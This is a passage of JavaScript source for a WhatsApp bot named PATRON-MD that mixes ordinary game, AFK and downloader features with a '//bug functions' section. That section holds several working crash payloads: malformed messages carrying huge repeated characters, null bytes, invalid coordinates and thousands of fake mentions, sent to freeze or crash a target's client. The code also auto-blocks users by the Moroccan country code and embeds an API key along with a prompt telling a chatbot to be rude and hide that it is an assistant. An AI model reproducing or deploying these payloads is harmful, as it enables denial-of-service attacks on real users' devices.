	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
	    if (roof) {
	    let win = ''
	    let tie = false
	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nop(e.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
	    if (/^(reject|no|later|n|nop(e.)?yes)/i.test(m.text)) {
	    NanoBotz.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} rejected the suit, the suit is canceled`, m)
	    delete this.suit[roof.id]
	    return !0
	    }
	    roof.status = 'play'
	    roof.asal = m.chat
	    clearTimeout(roof.waktu)
	    //delete roof[roof.id].waktu
	    NanoBotz.sendText(m.chat, `The suit has been sent to the chat

@${roof.p.split`@`[0]} and 
@${roof.p2.split`@`[0]}

Please select suit in each chat"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) NanoBotz.sendText(roof.p, `Please select \n\nrock🗿\nPaper\nScissors✂️`, m)
	    if (!roof.pilih2) NanoBotz.sendText(roof.p2, `Please select \n\nrock🗿\nPaper📄\nScissors✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) NanoBotz.sendText(m.chat, `Second Players don't want to play,\nSuit was canceled`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    NanoBotz.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Don't choose suit, game over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /Gunting/i
	    let b = /Batu/i
	    let k = /Kertas/i
	    let reg = /^(Gunting|Batu|Kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih2 ? `\n\n Waiting for the opponent to choose` : ''}`)
	    if (!roof.pilih2) NanoBotz.sendText(roof.p2, '_The opponent has chosen\kNow its your turn', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    reply(`You have chosen ${m.text} ${!roof.pilih ? `\n\n Waiting for the opponent to choose` : ''}`)
	    if (!roof.pilih) NanoBotz.sendText(roof.p, '_ The opponent has chosen\kNow its your turn', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    NanoBotz.sendText(roof.asal, `_*Suit results*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await NanoBotz.updateProfileStatus(`${NanoBotz.user.name} | Runtime : ${runtime(uptime)} | PATRON-MD`)
		setting.status = new Date() * 1
	    }
	}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return NanoBotz.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return 
}


//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {
console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await NanoBotz.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
async function sendNanoBotzMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await NanoBotz.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

const replynano = (teks) => {
NanoBotz.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.botname}`,
"body": `${nanoliatwaktu} ${pushname} 🚹`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://i.imgur.com/5wsWcjp.jpeg',
"sourceUrl": 'https://whatsapp.com/channel/0029Val0s0rIt5rsIDPCoD2q'}}},
{ quoted: m})
}

const reply = (teks) => {
NanoBotz.sendMessage(from, { text: teks }, { quoted : m})
}
const isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}
function msToDate(mse) {
    let temp = mse;
    let days = Math.floor(mse / (24 * 60 * 60 * 1000));
    let daysms = mse % (24 * 60 * 60 * 1000);
    let hours = Math.floor(daysms / (60 * 60 * 1000));
    let hoursms = mse % (60 * 60 * 1000);
    let minutes = Math.floor(hoursms / (60 * 1000));
    let minutesms = mse % (60 * 1000);
    let sec = Math.floor(minutesms / 1000);

    return `${days} Days ${hours} Hours ${minutes} Minutes`;
}

async function getGcName(groupID) {
            try {
                let data_name = await NanoBotz.groupMetadata(groupID)
                return data_name.subject
            } catch (err) {
                return '-'
            }
        }
//bug functions
async function dansyaytdl(link) {
    try {
        const response = await axios.get('https://y2ts.us.kg/token');
        const token = response.data.token;
        console.log('Token:', token);
        const url = `https://y2ts.us.kg/youtube?url=${link}`;
        const headers = {
            'Authorization-Token': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
            'Content-Type': 'application/json'
        };
const videoResponse = await axios.get(url, { headers });
        if (videoResponse.data.status) {
            const result = videoResponse.data.result || '';
            console.log('Title:', result.title || '');
            console.log('Description:', result.description || '');
            console.log('Views:', result.views || '');
            console.log('MP3 URL:', result.mp3 || '');
            console.log('MP4 URL:', result.mp4 || '');
            return result;
        } else {
            console.log('Status is false, no result found.');
        }
        
    } catch (error) {
        console.error('Error occurred:', error.message);
        if (error.response) {
            console.error('Response status:', error.response.status);
        }
    }
}
async function NanoTTDL(videoUrl) {
  try {
    const endpoint = "https://ssstik.io/abc?url=dl";
    const requestData = new URLSearchParams({
      id: videoUrl,
      locale: "id",
      tt: "VktkdWY4",
    });
    const headers = {
      "HX-Request": "true",
      "HX-Trigger": "_gcaptcha_pt",
      "HX-Target": "target",
      "HX-Current-URL": "https://ssstik.io/id",
      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    };
    const response = await axios.post(endpoint, requestData.toString(), { headers });
    const $ = cheerio.load(response.data);
    const title = $("h2").text().trim() || "Title not available";
    const description = $(".maintext").text().trim() || "Description not available";
    const downloadLink = $(".download_link.without_watermark").attr("href") || null;
    const hdDownloadLink = $(".download_link.without_watermark_hd").attr("href") || null;

    return {
      title,
      description,
      downloadLink,
      hdDownloadLink,
    };
  } catch (error) {
    console.error("Error saat scraping:", error.message);
    return { error: error.message };
  }
}
async function uploadwidipe(poto) {
  const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");
const path = require('path');
    try {
      const mime = require('mime-types');
  const form = new FormData();
  const contentType = mime.lookup(poto);
  const fileName = path.basename(poto);
  form.append('file', fs.createReadStream(poto), {
    contentType: contentType || 'application/octet-stream',
    filename: fileName,
  });
      const response = await axios.post('https://cdn.elxyzgpt.xyz/', form, {
        headers: form.getHeaders(),
        onUploadProgress: (progressEvent) => {
          if (progressEvent.lengthComputable) {
            console.log(`🚀 Upload Progress: ${(progressEvent.loaded * 100) / progressEvent.total}%`);
          }
        }
      });
    const hasilnya = response.data.fileUrl
      console.log('🎉 File Upload Success:', response.data);
      return hasilnya;
    } catch (error) {
      console.error('🚫 Upload Failed:', error);
      reject(error);
    }
}
async function nanoai(pushname, text) { 
  try {
    const encodedText = encodeURIComponent(text);
    const encodedPushname = encodeURIComponent(pushname);

    const url = `https://api.elxyzgpt.xyz/ai/character-ai?apikey=KC-d25a3f0c02be4021&character=Kamu adalah nano bot yang baik dan sopan gunakan bahasa kekinian, kasar untuk menjawab pertanyaan user dan jangan beri tahu bahwa kamu adalah asisten digital,dan sebut nama ${encodedPushname} saat dia bertanya apa saja&text=${encodedText}`;
    const data = await fetchJson(url);
    const response = data.result.response;

    reply(response);
  } catch (error) {
    console.error('Error fetching data:', error);
    reply('Error..');
  }
}
let example = (teks) => {
return `\n*Usage Example :*\ntype*${cmd}* ${teks}\n`
}
NanoBotz.ments = (teks = '') => {
return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : []
};
var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}
async function loadingx() {
      var loadingz = [
        "> *🕘 L O*",
        "> *🕣 L O A*",
        "> *🕠 L O A D*",
        "> *🕔 L O A D I*",
        "> *🕟 L O A D I N*",
        "> *🕔 L O A D I N G*",
        "> *🕔 L O A D I N G*",
        "> *🕐 L O A D I N G*",
        "> *🕧 L O A D I N G*",
        "*SUCCESSFULLY SENT TO THE AFTERLIFE 🚹*",
      ];
      let { key } = await NanoBotz.sendMessage(m.chat, {
        text: "*OKAY OTW SENDING BUGS 💀*",
      });

      for (let i = 0; i < loadingz.length; i++) {
        await sleep(400);
        await VxoZap.sendMessage(m.chat, { text: loadingz[i], edit: key });
      }
    }
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
const Null = {
key: {
remoteJid: 'cihuy',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"cihuy\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}
    async function CrashUi(X, Qtd, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ CrazyCrash ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ PatronCrash ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻ PatronCrash ⿻\n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ PatronCrash ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ CrazyCrash ⿻","sections":[{"title":"Patron-md IS HERE ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🚹","flow_id":"BY Patron","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await NanoBotz.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ ℙ𝔸𝕋ℝ𝕆ℕ-𝕄𝔻 ⿻ ▾⭑"));
    }
    async function InVisiXz(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "PATRON-MD🎭",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ PatronCrash ⿻ ▾⭑̤",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"PATRON 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ★","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟","sections":[{"title":"𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🚹","flow_id":"BY XXEN DEV","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VisiX,
        }
      );

      await NanoBotz.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ ＰＡＴＲＯＮ－ＭＤ ⿻ ▾⭑"));
    }
async function InVisiLoc(X, ThM, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "⭑̤▾ ⿻ ＰＡＴＲＯＮ－ＭＤ 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                  locationMessage: {
                    degreesLatitude: -999.03499999999999,
                    degreesLongitude: 922.999999999999,
                    name: "ＰＡＴＲＯＮ－ＭＤ 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⚝",
                    address: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "",
                },
                nativeFlowMessage: {
                  messageParamsJson: "ＰＡＴＲＯＮ－ＭＤ 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 玄",
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: {
                        title: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟",
                        sections: [
                          {
                            title: "ＰＡＴＲＯＮ－ＭＤ 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃  ϟ",
                            rows: [],
                          },
                        ],
                      },
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: {},
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: EsQl,
        }
      );
      await VxoZap.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ ＰＡＴＲＯＮ－ＭＤ ⿻ ▾⭑"));
    }
async function OLDLOC(target, QBug) {
var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "ＰＡＴＲＯＮ－ＭＤ 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 \n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦾ".repeat(20) + "@1".repeat(50000)
        },
        nativeFlowMessage: {
          messageParamsJson: " ꦾ".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await NanoBotz.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id })
};
async function BugFrezee(target) {
            NanoBotz.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐗𝐗𝐄𝐍𝐃𝐄𝐕 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 🥶" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0":"ＰＡＴＲＯＮ－ＭＤ 𝐀𝐍𝐓𝐈 𝐁𝐀𝐍𝐍𝐄𝐃 ⃟⃟⃟⃟⃟꙰꙰꙰꙰꙰꙰꙰꙱҈҈҈҈҈҈҉҉᠁",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await NanoBotz.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};
async function DocSystem(target) {
let virtex = "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟";

            NanoBotz.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🎭꙰꙰꙰꙰꙰꙰꙰꙰꙲꙱҈⃠𝐕𝐨𝐥𝐠𝐢𝐨𝐝 𝐈𝐬 𝐁𝐚𝐜𝐤🎭꙰҉҈⃟" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Patron || md" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function DocSystem2(target) {
            NanoBotz.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Patron-md" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
